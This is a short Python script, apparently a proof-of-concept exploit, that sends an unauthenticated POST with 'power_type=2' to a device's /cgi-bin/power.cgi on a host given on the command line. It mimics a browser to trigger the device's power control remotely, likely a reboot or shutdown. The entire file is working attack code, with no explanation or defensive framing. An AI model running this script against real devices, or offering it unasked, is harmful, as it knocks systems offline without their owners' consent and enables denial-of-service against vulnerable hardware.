import sys
import requests

target_url = "http://" + sys.argv[1] + "/cgi-bin/power.cgi"

print(f"Target URL: {target_url}")

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': f'http://{sys.argv[1]}',
    'Pragma': 'no-cache',
    'Referer': f'http://{sys.argv[1]}/power.html',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 OPR/117.0.0.0',
}

try:
    print("Requesting power control.")
    response = requests.post(target_url, headers=headers, data={'power_type': '2'}, verify=False)
    print(f"Response status code: {response.status_code}")
    print(f"Response text: {response.text}")
    print(response.text)
except requests.RequestException as e:
    print(f"Error during POST request: {e}")